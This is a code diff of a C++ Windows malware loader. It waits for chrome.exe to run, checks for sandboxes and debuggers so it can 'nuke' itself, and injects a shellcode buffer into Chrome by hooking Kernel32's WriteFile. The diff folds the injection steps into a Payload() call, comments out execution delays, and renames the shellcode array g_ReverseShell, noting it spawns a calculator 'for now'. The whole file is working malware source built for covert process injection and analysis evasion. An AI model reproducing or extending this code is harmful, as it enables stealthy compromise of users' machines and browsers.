@@ -5,6 +5,8 @@
 #include "../headers/payload.h"
 
 
+//#define TARGET_FUNC	"WriteFile"
+//#define TARGET_DLL	"Kernel32"
 #define TARGET_FUNC	"WriteFile"
 #define TARGET_DLL	"Kernel32"
 
@@ -19,10 +21,9 @@ extern "C" {
 
 
 DWORD GetPID(const char* process);
-void ExitProgram(const char* message);
 
-// spawn calculator
-unsigned char rawData[106] = {
+// spawn calculator for now
+unsigned char g_ReverseShell[106] = {
 		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
 		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
 		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
@@ -58,8 +59,6 @@ WCHAR* debuggers[] = {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	AntiAnalysis hide;
-	
-	ULONG_PTR uAddress = NULL;
 
 	auto& resolver = API::APIResolver::GetInstance();
 
@@ -67,9 +66,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	resolver.LoadModules();
 	resolver.ResolveFunctions();
 
-	auto resolved	  = resolver.GetAPIAccess();
+	auto api	  = resolver.GetAPIAccess();
 	
-	hide.DelayExecution(5, resolver); // wait 5 minutes before execution
+	//hide.DelayExecution(5, resolver); // wait 5 minutes before execution
 
 	
 	DWORD process = 0; 
@@ -77,65 +76,25 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	do
 	{
 		hide.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger
-		process = GetPID("chrome.exe");
+		process = GetPID("chrome.exe"); // Check if chrome is running
 
 		if (process != 0)
 		{
-			hide.DelayExecution(0.2, resolver);
+			//hide.DelayExecution(0.2, resolver);
 			break;
 		}
 
-		hide.DelayExecution(0.2, resolver); // This should be every couple of minutes
+		//hide.DelayExecution(0.2, resolver); // This should be every couple of minutes
 	} while (process == 0);
 
-
-	HMODULE hModule = GetModuleHandleA(TARGET_DLL);
-
-	if (hModule == INVALID_HANDLE_VALUE)
-	{
-		MessageBoxA(NULL, "invalid module handle", "error", MB_ICONWARNING);
-		return -1;
-	}
+	Payload(process, api, TARGET_DLL, TARGET_FUNC);
 	
-	FARPROC pFunctionToHook = GetProcAddress(hModule, TARGET_FUNC);
-
-	if (!pFunctionToHook)
-	{
-		MessageBoxA(NULL, "couldn't get address of function", "error", MB_ICONWARNING);
-		return -1;
-	}
-	
-
-	PatchHook(pFunctionToHook);
-
-
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, process);
-
-	if (hProcess == INVALID_HANDLE_VALUE)
-		ExitProgram("failed to get a handle to the process");
-
-	if (!LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(rawData) + sizeof(g_HookShellCode), resolved))
-		ExitProgram("failed to find a memory gap");
-
-
-	if (!WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)g_HookShellCode, sizeof(g_HookShellCode), (ULONG_PTR)rawData, sizeof(rawData)))
-		ExitProgram("failed to write payload buffer");
-
-
-	if (!InstallHook(hProcess, pFunctionToHook, reinterpret_cast<void*>(uAddress)))
-		ExitProgram("failed to install hook");
-	
-	MessageBoxA(NULL, "stage 1 complete", "error", MB_ICONWARNING);
-
-
+	hide.Nuke(resolver);
 	return 0;
 } 
 
-void ExitProgram(const char* message)
-{
-	MessageBoxA(NULL, message, "error", MB_ICONWARNING);
-	ExitProcess(-1);
-}
+
+
 
 
 DWORD GetPID(const char* process) {
